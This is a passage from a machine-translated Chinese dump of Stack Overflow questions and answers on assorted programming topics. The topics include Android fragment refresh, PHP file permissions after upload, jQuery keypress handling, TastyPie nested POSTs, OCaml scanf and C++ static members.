} catch(Exception ex) {
    ex.printStackTrace();
}

getFragmentManager()
    .beginTransaction()
    .replace(R.id.flContent, frg)
    .commit(); 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2017-01-27T07:36:44.713

我正在使用 remove 和 replace 来刷新 Fragment 的内容，例如

```
final FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
fragmentTransaction.remove(resetFragment).commit();
fragmentTransaction.replace(R.id.frame_container,resetFragment).commit(); 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2017-03-26T06:24:43.943

让我们看看下面的源代码。这里片段名称是 DirectoryOfEbooks。后台任务完成后，我正在用当前片段替换框架。所以片段被刷新并重新加载它的数据

```
 import android.app.ProgressDialog;
    import android.content.DialogInterface;
    import android.database.Cursor;
    import android.database.sqlite.SQLiteDatabase;
    import android.os.AsyncTask;
    import android.os.Bundle;
    import android.support.v4.app.Fragment;
    import android.support.v4.app.FragmentTransaction;
    import android.support.v4.view.MenuItemCompat;
    import android.support.v7.app.AlertDialog;
    import android.support.v7.widget.DefaultItemAnimator;
    import android.support.v7.widget.GridLayoutManager;
    import android.support.v7.widget.LinearLayoutManager;
    import android.support.v7.widget.RecyclerView;
    import android.support.v7.widget.SearchView;
    import android.view.LayoutInflater;
    import android.view.Menu;
    import android.view.MenuInflater;
    import android.view.MenuItem;
    import android.view.View;
    import android.view.ViewGroup;
    import android.widget.TextView;
    import android.widget.Toast;

    import com.github.mikephil.charting.data.LineRadarDataSet;

    import java.util.ArrayList;
    import java.util.List;

    /**
     * A simple {@link Fragment} subclass.
     */
    public class DirectoryOfEbooks extends Fragment {

        RecyclerView recyclerView;
        branchesAdapter adapter;
        LinearLayoutManager linearLayoutManager;
        Cursor c;
        FragmentTransaction fragmentTransaction;
        SQLiteDatabase db;
        List<branch_sync> directoryarraylist;

        public DirectoryOfEbooks() {
            // Required empty public constructor
        }
        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {

            View view = inflater.inflate(R.layout.fragment_directory_of_ebooks, container, false);
            directoryarraylist = new ArrayList<>();
            db = getActivity().openOrCreateDatabase("notify", android.content.Context.MODE_PRIVATE, null);
            c = db.rawQuery("select * FROM branch; ", null);

            if (c.getCount() != 0) {
                c.moveToFirst();
                while (true) {
                    //String ISBN = c.getString(c.getColumnIndex("ISBN"));
                    String branch = c.getString(c.getColumnIndex("branch"));

                    branch_sync branchSync = new branch_sync(branch);
                    directoryarraylist.add(branchSync);
                    if (c.isLast())
                        break;
                    else
                        c.moveToNext();
                }

                recyclerView = (RecyclerView) view.findViewById(R.id.directoryOfEbooks);
                adapter = new branchesAdapter(directoryarraylist, this.getContext());
                adapter.setHasStableIds(true);
                recyclerView.setItemAnimator(new DefaultItemAnimator());
                System.out.println("ebooks");
                recyclerView.setHasFixedSize(true);
                linearLayoutManager = new LinearLayoutManager(this.getContext());
                recyclerView.setLayoutManager(linearLayoutManager);
                recyclerView.setAdapter(adapter);
                System.out.println(adapter.getItemCount()+"adpater count");

            }
            // Inflate the layout for this fragment
            return view;
        }
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            //setContentView(R.layout.fragment_books);
            setHasOptionsMenu(true);
        }
        public void onPrepareOptionsMenu(Menu menu) {
            MenuInflater inflater = getActivity().getMenuInflater();
            inflater.inflate(R.menu.refresh, menu);
            MenuItem menuItem = menu.findItem(R.id.refresh1);
            menuItem.setVisible(true);
        }
        public boolean onOptionsItemSelected(MenuItem item) {
            if (item.getItemId() == R.id.refresh1) {
                new AlertDialog.Builder(getContext()).setMessage("Refresh takes more than a Minute").setPositiveButton("Refresh Now", new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface dialog, int which) {

                        new refreshebooks().execute();
                    }
                }).setNegativeButton("Refresh Later", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {

                    }
                }).setCancelable(false).show();

            }
            return super.onOptionsItemSelected(item);
        }

    public class refreshebooks extends AsyncTask<String,String,String>{
        ProgressDialog progressDialog;
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
          progressDialog=new ProgressDialog(getContext());
            progressDialog.setMessage("\tRefreshing Ebooks .....");
            progressDialog.setCancelable(false);
            progressDialog.show();
        }

        @Override
        protected String doInBackground(String... params) {
            Ebooksync syncEbooks=new Ebooksync();
            String status=syncEbooks.syncdata(getContext());
            return status;

        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            if(s.equals("error")){
                progressDialog.dismiss();
                Toast.makeText(getContext(),"Refresh Failed",Toast.LENGTH_SHORT).show();
            }
            else{
                fragmentTransaction = getActivity().getSupportFragmentManager().beginTransaction();
                fragmentTransaction.replace(R.id.mainframe, new DirectoryOfEbooks());
                fragmentTransaction.commit();
                progressDialog.dismiss();
                adapter.notifyDataSetChanged();
                Toast.makeText(getContext(),"Refresh Successfull",Toast.LENGTH_SHORT).show();
            }

        }
    }

    } 
```

# php - PHP：在 move_uploaded_file() 之后添加对文件的写权限

> ID：15262748
> 
> 赞同：6
> 
> 时间：2013-03-07T03:53:26.333
> 
> 标签：php, file-upload, chmod

使用 PHP 上传图像后，我想让图像文件可写以便为其添加水印。以下是我使用的代码：

```
if(isset($_FILES['file_poster']['tmp_name']) && $_FILES['file_poster']['tmp_name'] != '') {
        $random_filename = substr(md5(time()), 0, 9);
        $ext = '.jpg';
        if(strpos(strtolower($_FILES['file_poster']['name']), '.png') > -1) {
            $ext = '.png';
        }

        move_uploaded_file($_FILES['file_poster']['tmp_name'], 'uploads/' .  $random_filename . $ext);
        chmod(ABS_PATH . $random_filename, 0666);
        $random_filename = 'uploads/' .  $random_filename . $ext;

        // add watermark codes omitted
} 
```

文件上传后，文件权限变为**644**。然后我尝试使用`chmod()`将其更改为可写（**666**），但权限没有改变。

该`/uploads`文件夹具有权限**777**。是否有任何原因导致`chmod()`功能无法更改权限？还是有解决方法？

注意：使用 PHP 5。GD 工作正常。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-07T04:32:18.287

看起来你需要交换你的最后两行，例如

```
$random_filename = 'uploads/' .  $random_filename . $ext;
chmod(ABS_PATH . $random_filename, 0666); 
```

使用相对路径时要非常小心，例如`'uploads/' . $random_filename . $ext`. 如果工作文件包含在另一个文件中，则当前目录可能不同。

我会推荐这样的东西

```
$destFile = __DIR__ . '/uploads/' . $random_filename . $ext;
move_uploaded_file($_FILES['file_poster']['tmp_name'], $destFile);
chmod($destFile, 0666); 
```

其中魔术`__DIR__`常量始终包含您实际所在文件的父目录的绝对路径。

# visual-studio-2012 - 无法创建 Visual Studio 2012 MVC4 WebAPI 项目

> ID：15262750
> 
> 赞同：1
> 
> 时间：2013-03-07T03:53:36.533
> 
> 标签：visual-studio-2012

我已经安装了 Visual Studio 2012 Ultimate。我试图创建新项目 - MVC4 - WebAPI。我收到错误消息**“系统找不到指定的文件。（HRESULT 异常：0x80070002）”**

我也重新安装了 vs 2012 和修复模式。我仍然无法摆脱此错误消息。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-25T15:09:51.530

从下载 ASP.NET Web 工具 2012.2

[http://www.asp.net/downloads](http://www.asp.net/downloads)并安装它

我非常肯定您应该能够使用 Visual Studio 2012 创建 ASP.NET MVC 项目。

# java - JTree 只会更新一个节点。DOM4J DocumentTreeModel 底层

> ID：15262752
> 
> 赞同：1
> 
> 时间：2013-03-07T03:53:58.390
> 
> 标签：java, xml, swing, jtree, dom4j

我有一个使用 DOM4J 与 XML Doc 链接的 JTree。我有一个弹出窗口，允许我在我选择的地方添加节点。

```
public void addNode() {
        BranchTreeNode node = (BranchTreeNode) getLastSelectedPathComponent();
        if ((node.getXmlNode() instanceof Element)
                && (node.getXmlNode().getName().equals(ROOT))) {
            Element root = (Element) node.getXmlNode();
            Element element = root.addElement(NODE);            
        }
    } 
```

这对底层 XML 非常有用，我可以保存它并完美地阅读它。问题是它只会在树中添加一个节点，无论我添加多少个节点，它都只会显示一个，并且那个是一个孩子等等。我试过了

```
treeModel.reload(); 
treeModel.reload(node);
treeModel.nodeChanged(node); 
```

就在刚才，在 Eclipse 中查找拼写，这很有趣

```
treeModel.setDocument(treeModel.getDocument()); 
```

所以我想我现在的问题是：这是正确的方法吗？我错过了什么吗？

# wpf - 使用 MVVM / Caliburn.Micro 实现运行文本日志的最佳方法是什么？

> ID：15262756
> 
> 赞同：0
> 
> 时间：2013-03-07T03:54:11.747
> 
> 标签：wpf, xaml, mvvm, caliburn.micro

我有一个表格，可以促进产生运行日志的长时间运行操作。用 MVVM / WPF 实现这个的好方法是什么？

我可以将一个字符串属性绑定到 a`TextBlock`或 a`TextBox`并不断更新它，但这似乎产生了很多字符串。或者，我可以有一个字符串列表，继续向其中添加新字符串并绑定到列表框。

是否有第三种选择，或者上述任何一种都比另一种更可取？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T06:41:24.080

我认为，除了想要利用 MVVM 的考虑之外`INotifyPropertyChange`，这完全是风格问题，而不是硬性和快速的规则集。无论如何，您将为每次更新生成新字符串，因此我不会非常担心它，除非内存成为限制并且您必须丢弃旧字符串或维护某种当前缓冲区。您一直在考虑我通常使用的方法。

完成此操作后，我使用了一个 TextBox，但我没有强烈的论据来选择它而不是`TextBlock`. 我通常也使用一个`ObservableCollection<string>`列表而不是列表，只是为了 MVVM 的`INotifyPropertyChange`优点，并且每次更新都将它添加到集合中。

# c# - 如何用 SelectedText 替换最后一条评论

> ID：15262758
> 
> 赞同：0
> 
> 时间：2013-03-07T03:54:14.710
> 
> 标签：c#, winforms

我在编辑器上工作，我想在智能感知出现后替换最后一条评论。

还有更多这里的场景，

我得到了richtextbox(rtb) 作为代码编辑器，以及一个隐藏的combobox(lb) 作为智能感知。每次我从richtextbox（rtb）输入单词时，我输入“as”，组合框将出现（如智能感知），关键字以“as”开头。

除了我从组合框中选择一个项目后，所有功能现在都在工作

```
sample string(combo box items): asd, asdf, asdfg . 
```

然后假设我在richtextbox中输入然后我从组合框中选择'asd'，然后当我按下输入时输出将是：

> 作为asd

代替：

> 作为（仅）

更多继承人我的关键事件代码：

```
 void lb_KeyDown(object sender, KeyEventArgs e)
    {

        if (e.KeyCode == Keys.Escape)
        {
            lb.Visible = false;
            lb.Items.Clear();
        }

        if (e.KeyCode == Keys.Enter)
        {
            int start = 0, end = 0;
            String line = rtb.Text.Substring(start, start - end);
            int index = start;

            string comment = line.Substring(index);
            rtb.SelectedText = lb.SelectedText.ToString();

        }
    } 
```

注意：我只是写：

> rtb.SelectedText = 评论 + " " + lb.SelectedText.ToString();

现在看看其他一些功能，但那条线是我要修复的。我什至尝试：

```
 rtb.SelectedText = comment - lb.SelectedText.ToString(); 
```

> 但它说运算符'-'不能应用于'string'和'string'类型的操作数

真的感谢您提前提供的帮助。

范围：

```
if (token == "letterA" || token.StartsWith("Ab") || token.StartsWith("ab") || token.StartsWith("AB"))
            {
                int length = line.Length - (index - start);
                string commentText = rtb.Text.Substring(index, length);
                rtb.SelectionStart = index;
                rtb.SelectionLength = length;
                lb.Visible = true;

                KeyWord keywordsHint = new KeyWord();

                foreach (string str in keywordsHint.ab)
                {
                    lb.Items.Add(str);
                    lb.SelectedIndex = lb.FindStringExact(str);
                }
                //token.Replace(lb.SelectedText,"");
            } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:04:37.440

我认为这个问题/答案可能是问题所在：

[ComboBox.SelectedText 没有给我 SelectedText](https://stackoverflow.com/questions/10194171/combobox-selectedtext-doesnt-give-me-the-selectedtext)

尝试使用：

rbt。**SelectedText** = 评论 + " " + 磅**文本**

而不是 SelectedText。

# google-apps-script - 在 webapp GUI builder 中抛出错误消息

> ID：15262764
> 
> 赞同：0
> 
> 时间：2013-03-07T03:54:36.590
> 
> 标签：google-apps-script

我有一个使用 GUI 构建器构建的非常复杂的用户界面。

在我向代码中添加了 8 个更多的服务器端函数之前，一切都按承诺工作。在 GUI Builder 中（当我尝试将这些新功能附加到鼠标上时，GUI Builder 会在脚本编辑器顶部以粉红色条纹显示“发生意外错误”。

当我清除错误时，项目似乎没问题，我可以保存并运行应用程序。如果我转到任何以前触发服务器端处理程序的对象并尝试更改它，我会得到相同的错误。

我怀疑当 GUI 构建器尝试从代码源加载可用函数列表时会发生故障。我的代码正在运行超过 50 个 Gscript 函数。

如果 GUI Builder 可以处理的内容有一些限制，那么记录这些内容会非常好。还有一个更有意义的错误消息会很好。

我假设我仍然可以在代码库（GUI Builder 之外）中添加/附加这些处理程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T20:53:46.037

你最好使用完整的脚本应用程序而不是 GUI ..我放弃了 GUI 因为有一些奇怪的东西..作为 ID 管理，名称管理，单选按钮（错误以及普通脚本中的错误..^^）..GUI对我来说是一个黑匣子..只需尝试使用垂直水平或 xy 面板制作您的应用程序...您将能够知道谁在做什么以及何时...使用记录器

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T06:23:08.063

当您尝试`getElementById`使用不存在的 Id 时，会出现此错误消息。请检查您的 GUI 中的所有小部件 ID。我很确定您的问题与某些系统限制无关，我已经使用 GUI 构建器制作了一些复杂的 UI，没有问题。

# javascript - 在 javascript 文件中访问来自 Google App Engine 数据存储区的数据

> ID：15262768
> 
> 赞同：4
> 
> 时间：2013-03-07T03:54:57.157
> 
> 标签：javascript, google-app-engine, google-cloud-datastore

从 javascript 文件中的 Google App Engine 数据存储区访问信息的选项有哪些？

**背景：**

我正在使用 Google Chart Tools API 的 Google App Engine 上运行一个应用程序。我想绘制的所有数据都在我的 Google App Engine 数据存储中。

**我试过的**

我可以访问我的 python 脚本中的数据。此外，在 python 脚本中，我将数据编码为 JSON。我的想法是将其保存在一个 js 文件中，我可以将其导入 HTML，然后在那里构建图表。但是，这不起作用，因为 App Engine 不支持写入本地文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:07:48.827

在 App Engine 上，您通常会生成一个提供给客户端的 HTML 页面。您不需要将 JSON 保存到 js 文件中，您可以将其作为文本直接嵌入到您提供给客户端的 HTML 页面中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:36:28.623

您可以使用 Jersey 之类的东西为后端创建一个 REST api。这有点工作。您还可以使用 appengine 项目制作 GWT 应用程序，该项目具有非常简单的后端连接。然后，您可以将其与您的 javascript 应用程序连接起来，或者使用您的 javascript 应用程序可以使用的钩子。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T11:57:08.133

[XMLHttpRequest](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Using_XMLHttpRequest)

从 python 文件：将 JSON 数据写入 URL。在 App Engine 中，这是通过

```
self.response.write(data) 
```

在 Javascript 中，像这样发出 XHR 请求：

```
function getData() {
    var dataObject = new XMLHttpRequest();
    dataObject.open('GET', 'URL', true);
    dataObject.send();
    return dataObject;
} 
```

这将返回一个 XMLHttpRequest 对象，其中包含 response 或 responseText 属性中的字符串中的数据。

# requirejs - Require.js 没有正确编译单个 js 文件

> ID：15262770
> 
> 赞同：12
> 
> 时间：2013-03-07T03:55:07.527
> 
> 标签：requirejs

我正在尝试将我的 require.js 模块构建到一个用于生产的 javascript 文件中。

我正在运行的命令是...

```
r.js -o name=main out=main.min.js mainConfigFile=main.js 
```

这会编译，但编译后的 main.min.js 文件未正确编译，仍包含“define”语句块。并且浏览器显然返回

```
Uncaught ReferenceError: define is not defined 
```

我的 main.js 文件如下所示：

```
require.config({
    paths: {
        jquery: 'libs/jquery/jquery',
    },
    shim: {
        bootstrap: {
            deps: ['jquery'],
            exports: 'jquery'
        }
    }
});
require(['app', 'jquery'], function (app, $) {
    'use strict';
    // use app here
    console.log(app);
    console.log('Running jQuery %s', $().jquery);
}); 
```

请让我知道我在这里俯瞰什么。谢谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-13T17:10:22.097

你是对的，你需要在你的构建中包含 requireJS 。看看[http://requirejs.org/docs/optimization.html#onejs](http://requirejs.org/docs/optimization.html#onejs)。您会在此处找到命令行示例。如果您使用的是构建配置文件，它将看起来像这样 -

```
({
baseUrl: "../Scripts",
paths: {
    requireLib: 'libs/require'
},
name: "main",
out: "main-built.js",
include: ["requireLib"]
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-11T09:49:45.713

**快速修复：**使用`r.js -o build.js`而不是`node r.js -o build.js`

* * *

当我尝试`r.js`通过节点调用时遇到了问题：

`node r.js -o build.js`

直接调用`r.js`解决了问题：

`r.js -o build.js`

*注意：`r.js`全局安装`npm install -g requirejs`*

# jquery - Jquery keypress 方法在 Mozilla 中无法正常工作

> ID：15262779
> 
> 赞同：1
> 
> 时间：2013-03-07T03:55:49.700
> 
> 标签：jquery

以下代码在 IE9 和 Chorme 中运行良好，但在 mozilla 中无法运行

```
$("#BasicSalary").keypress(function (event) {
          if (event.keyCode < 46 || event.keyCode > 57) {
            event.preventDefault();
           }
          else if (event.keyCode == 47) {
            event.preventDefault();
           }
       }); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:57:09.753

更改`keyCode`为`which`，它将更加跨浏览器兼容。您可以添加故障转移以使其更加可靠：

```
$("#BasicSalary").keypress(function (e) {

    var keyCode = (typeof e.which == "number") ? e.which : e.keyCode

    if (keyCode  < 46 || keyCode  > 57) {
        e.preventDefault();
    } else if (keyCode  == 47) {
        e.preventDefault();
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:58:44.307

试试这个：

```
 $("#BasicSalary").keypress(function (event) {
      var keycode = event.keyCode || event.which;

      if (keycode < 46 || keycode > 57) {
        event.preventDefault();
       }
      else if (keycode == 47) {
        event.preventDefault();
       }
   }); 
```

# php - 单击动态创建的链接无法识别单击事件

> ID：15262781
> 
> 赞同：0
> 
> 时间：2013-03-07T03:56:07.333
> 
> 标签：php, jquery

当您单击文件夹时，导航部分会附加一个按钮/链接，但是当我单击添加的按钮时，它将不起作用。由于某种原因它无法识别我的点击事件..？

我正在处理的快速视频。[https://www.youtube.com/watch?v=NsW1uLbRd9w](https://www.youtube.com/watch?v=NsW1uLbRd9w)

我不知道为什么它不起作用啊hhhh任何帮助都会很棒，谢谢。如果您需要更多代码，我可以在需要时发送。

```
 <script>
      $(function () {
        // When folder is clicked open it
        $('button.<?php echo $row->folderName; ?>').bind('click', function() { 
            $('.open.<?php echo $row->folderName;?>').show();
              // if folder is open then Prepend homebtn button to nav
              var k = $('.open').css('display');
              if(k == 'block') {
                $('.nav').prepend('<a class="gohome">HELLO</a>');
              }
        });
            $('.gohome').live('click', function() {
                $('.open.<?php echo $row->folderName; ?>').hide();
              });

      });
    </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:06:05.680

要绑定到未来的元素，您需要将事件绑定到执行过程时存在的父级。由于您的链接被添加到`.nav`，这就是我们可以使用的。我假设`.nav.`运行此代码时存在。如果没有，请使用`$(document).on('click'...`

```
 $('.nav').on('click', '.gohome', function() {
      $('.open.<?php echo $row->folderName; ?>').hide();
  }); 
```

# position - 自定义 UITableViewCell 附件未正确定位

> ID：15262784
> 
> 赞同：1
> 
> 时间：2013-03-07T03:56:46.310
> 
> 标签：position, uitableview

我在分组样式表中有 2 个自定义单元格。一个加载的 xib 表单可以正确定位附件视图，而使用情节提要创建的那个没有，尽管我认为它与单元格的尺寸有关。见图片：

编辑：如果在代码中设置了附件或者通过 IB 指定了标准附件，则无关紧要

![在此处输入图像描述](../Images/cee5ba7bc792e5a58d5398ca6c7d983a.png)

任何想法为什么会发生这种情况以及如何解决它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T16:49:40.213

在自定义单元格中覆盖 layoutSubviews 并执行类似的操作似乎可以解决问题。但是我仍然不清楚，x 偏移量应该添加 10 使其接近，但它实际上应该是什么？如何根据单元格的高度计算偏移量？

```
- (void)layoutSubviews {
     [super layoutSubviews];
     self.accessoryView.frame = CGRectMake(self.accessoryView.frame.origin.x **+10**,self.accessoryView.frame.origin.y, self.accessoryView.frame.size.width,self.accessoryView.frame.size.height);
} 
```

# javascript - 骨干视图未填充

> ID：15262787
> 
> 赞同：1
> 
> 时间：2013-03-07T03:57:05.427
> 
> 标签：javascript, backbone.js

我将一个集合和一个模型传递给我的视图：

```
 popModel = new GenreModel({genre_name:'Pop',genre_id:'pop'});
 popView = new GenreView ({model:popModel,collection:new PopCol()}); 
```

这是视图的实现：

```
Backbone.View.extend ({
    className:'sect',

    initialize: function ()
    {
        context = this;
        this.collection.fetch ({
            success:function ()
            {
                context.render();
            }
        });     
    },

    render: function ()
    {
        console.log("hello");
        this.$el.html (_.template(view,this.model.toJSON()));
        this.collection.each (function (video) 
        {
            genreLi = new GenreLi ({model:video});
            this.$(this.model.genre_id).append (genreLi.el);
        },this);

        return this;
    },

}); 
```

我的问题是，当我调用 console.log (popView.el) 时，我得到以下信息：

```
<div class="sect"></div>
hello 
```

视图没有填充，但是当我调用 console.log (popView.render.el) 我得到：

```
hello 
<div class=​"sect">​…​&lt;/div>​
hello 
```

视图然后正确呈现。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:20:37.837

我猜你正试图在 ul li 列表中显示所有相同类型的视频。我认为您在获取元素时缺少 id 之前的“#”。

```
render: function ()
{
    ...
    this.collection.each (function (video) 
    {
        genreLi = new GenreLi ({model:video});
        // if you have already defined elements by genre id and not within the view's el
        // This is not good as a view should attach new html into dom elements under it 
        $('#'+this.model.genre_id).append (genreLi.el);

        // if you have defined elements by genre id within in the view'w el then
        this.$el.find('#'+this.model.genre_id).append (genreLi.el);

    },this);

    return this;
}, 
```

# python - TastyPie 嵌套 POST 无法添加对象 - NoneType 没有属性错误

> ID：15262788
> 
> 赞同：0
> 
> 时间：2013-03-07T03:57:08.943
> 
> 标签：python, django, tastypie

我有一个非常简单的嵌套模型。

```
class Game(models.Model):
  name = models.CharField(max_length=200)
  description = models.TextField()
  user = models.ForeignKey(User)

class Activity(models.Model):
  game = models.ForeignKey(Game, related_name = 'activities')
  type = models.CharField(max_length=4)
  score = models.DecimalField(max_digits=3, decimal_places=2) 
```

我可以通过管理员创建对象，并且运行顺利。然后我使用 TastyPie 创建了一个 API。我的资源如下所示：

```
class GameResource(ModelResource):
  user = fields.ToOneField(UserResource, 'user')
  app = fields.ToOneField(AppResource, 'app')
  activities = fields.ToManyField('api.resources.ActivityResource', 'activities', full=True, related_name='activity')

  class Meta:
    queryset = Game.objects.all()
    resource_name = 'games'
    list_allowed_methods = ['get','post']
    detail_allowed_methods = ['get','put','post','delete']
    authentication = ApiKeyTokenAuthentication()
    authorization = Authorization()
    serializer = CustomJSONSerializer(formats=['json'])

  def apply_authorization_limits(self, request, object_list):
    return object_list.filter(user=request.user)

  def obj_create(self, bundle, request=None, **kwargs):
    requestApp = App.objects.get(api_key=request.api_key)
    return super(GameResource, self).obj_create(bundle, request, app=requestApp)

  def get_object_list(self, request):
    return super(GameResource, self).get_object_list(request).filter(app__api_key=request.api_key)

class ActivityResource(ModelResource): 
  game = fields.ForeignKey(GameResource, 'game')

  class Meta:
    queryset = Activity.objects.all()
    resource_name = 'activities'
    list_allowed_methods = ['get','post']
    detail_allowed_methods = ['get','put','post','delete']
    authentication = ApiKeyTokenAuthentication()
    authorization = Authorization()
    serializer = CustomJSONSerializer(formats=['json'])

  def apply_authorization_limits(self, request, object_list):
    return object_list.filter(game__user=request.user)

  def obj_create(self, bundle, request=None, **kwargs):
        return super(ActivityResource, self).obj_create(bundle, request)

  def get_object_list(self, request):
        return super(ActivityResource, self).get_object_list(request).filter(game__app__api_key=request.api_key) 
```

我从应用程序中发布了这本字典，其中包含游戏中嵌套的活动。

```
{
    name = "Monte";
    description = "To search for the holy grail.";
    user = "/api/v1/users/2/";
    activities =     (
                {
            type = "eggs";
            score = "0.50";
        }
    );
} 
```

结果是在数据库中创建了游戏，但是当 TastyPie 尝试创建嵌套的 Activity 对象时，它吐出一个错误。该错误表示当它尝试获取活动列表时，它无法找到与 api_key 匹配的活动。我不明白它为什么要尝试获取对象，并且我不明白如果它使用发送请求的应用程序正确创建游戏，则 NoneType 来自哪里。您可以看到我找到了与 request.api_key 匹配的应用程序并将其设置为游戏的应用程序。

```
"error_message": "'NoneType' object has no attribute 'api_key'"
    super(ActivityResource, self).get_object_list(request).filter(game__app__api_key=request.api_key)\n\nAttributeError: 'NoneType' object has no attribute 'api_key'\n" 
```

我错过了什么？我的资源和获取活动的方式有问题吗？

作为旁注......我可以发布一本字典：

```
 {
        game = "/api/v1/games/2/"
        type = "eggs";
        score = "0.50";
    } 
```

当我将其发布到活动时，它会正确创建活动。当我通过 API 获取活动时，它看起来就像那样。

所以问题不在于创建活动，而在于创建嵌套在游戏中的活动。

**更新：**

我放了一些断点，发现在resource_from_data中它正在调用obj_update而不是在请求中发送，因此request = NoneType。这是 TastyPie 中的错误吗？

```
def resource_from_data(self, fk_resource, data, request=None, related_obj=None, related_name=None):
    """
    Given a dictionary-like structure is provided, a fresh related
    resource is created using that data.
    """
    # Try to hydrate the data provided.
    data = dict_strip_unicode_keys(data)
    fk_bundle = fk_resource.build_bundle(data=data, request=request)

    if related_obj:
        fk_bundle.related_obj = related_obj
        fk_bundle.related_name = related_name

    # We need to check to see if updates are allowed on the FK
    # resource. If not, we'll just return a populated bundle instead
    # of mistakenly updating something that should be read-only.
    if not fk_resource.can_update():
        return fk_resource.full_hydrate(fk_bundle)

    try:
        return fk_resource.obj_update(fk_bundle, request, **data)
    except NotFound:
        try:
            # Attempt lookup by primary key
            lookup_kwargs = dict((k, v) for k, v in data.iteritems() if getattr(fk_resource, k).unique)

            if not lookup_kwargs:
                raise NotFound()

            return fk_resource.obj_update(fk_bundle, **lookup_kwargs)
        except NotFound:
            return fk_resource.full_hydrate(fk_bundle)
    except MultipleObjectsReturned:
        return fk_resource.full_hydrate(fk_bundle) 
```

# ruby-on-rails - 仅为类及其子类添加哈希方法

> ID：15262790
> 
> 赞同：0
> 
> 时间：2013-03-07T03:57:24.987
> 
> 标签：ruby-on-rails, class

如果我想要添加方法“好吗？” 进入散列，但仅适用于 C1 类及其子类。怎么做？例如

```
class C1
 class Hash
   def ok?
      return 'nested hash ok'
   end
  end
 def m1
    return Hash.new.ok?  #works
 end
 def m2
    return {}.ok? #not works
 end
end

<<In other file>>
class C2 < C1
 def m1_1
    return {}.ok?   #not works
 end
end 
```

如何添加“{}.ok？” 只是在 C1 中，它是 C2 的子类，每个文件中都不需要模块，但有点像 inhirt

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T09:58:26.520

这不会添加新方法`::Hash`

```
class C1
  class Hash
    def ok?
      return 'nested hash ok'
    end
  end
end 
```

它创建了一个`C1::Hash`与`Hash`. 如果您想修改补丁`::Hash`但不在全局范围内，请查看以下内容：http: [//yehudakatz.com/2010/11/30/ruby-2-0-refinements-in-practice/](http://yehudakatz.com/2010/11/30/ruby-2-0-refinements-in-practice/)

但是，这仅在 ruby​​ 2.0.0 中可用。

# ocaml - 为什么“%d”在 OCaml scanf 格式中是错误的？

> ID：15262793
> 
> 赞同：0
> 
> 时间：2013-03-07T03:58:01.077
> 
> 标签：ocaml

当我用 ocaml 实现 read_int 函数时（见下文），

```
let read_int () = Scanf.bscanf Scanf.Scanning.stdin "%d" (fun x -> x) 
```

如果格式参数是`%d`(no space) ，编译器将返回失败并显示以下信息：

```
Exception:
Scanf.Scan_failure
"scanf: bad input at char number 1: ``character '\\n' is not a decimal digit''". 
```

但是如果我使用`' '%d`（带空格的前缀），那很好，为什么`%d`错了？`%d`和有什么区别`' '%d`？. 谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T05:54:54.547

`scanf`格式`"%d"`匹配一串十进制数字。这不包括空格。在`scanf`格式字符串中，空格 ( `" "`) 代表任意数量的空白（空格、制表符、换行符）。

真的不可能确切地知道发生了什么，因为我不知道你的程序的标准输入上出现了什么。可能问题`'\n'`出在上一行的末尾。

**更新**：对于它的价值，我很久以前（在我的 C 编程时代）决定`scanf`导致的问题多于解决的问题。它在处理输入行方面特别糟糕。最好通过另一种方法将输入分成几行并在结果字符串上使用`sscanf`(或)。`int_of_string`

# c++ - 成员不能在当前范围内定义

> ID：15262799
> 
> 赞同：1
> 
> 时间：2013-03-07T03:59:01.937
> 
> 标签：c++

我目前正在检查电子邮件地址的顶级域。为了检查，我将它与一个文本文件列表进行比较。我想将列表导入静态地图容器。但是，当我尝试实例化它时，它说它不能在当前范围内定义。这是为什么？

这是我的一些头文件：

```
 class TldPart {
    public:
        static void LoadTlds();
    private:
        static map<string,bool> Tld;
    } 
```

这是cpp中的实现：

```
 void TldPart::LoadTlds()
    {
        map<string,bool> Tld;
        ...
    } 
```

它告诉我 ValidTld 不能在 LoadTlds 函数中定义。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:10:10.010

类的静态成员存在于对象之外。您应该在类之外定义和初始化静态成员。

这里我们定义并初始化一个静态类成员：

**头文件：**

```
#pragma once

#include <map>
#include <string>

class TldPart {
public:
    static void LoadTlds();
private:
    static std::map<std::string, bool> tld;
}; 
```

**你的 cpp 文件：**

```
#include "external.h"

std::map<std::string,bool> TldPart::tld;

void TldPart::LoadTlds()
{
    tld.insert(std::make_pair("XX", true));
} 
```

并且不要忘记课堂结束时的分号。

编辑：您可以为 const 整数类型的静态成员或 constexprs 且具有文字类型的静态成员提供类内初始化程序。

# php - 在 PHP/SQLite 中获取图像的路径

> ID：15262804
> 
> 赞同：0
> 
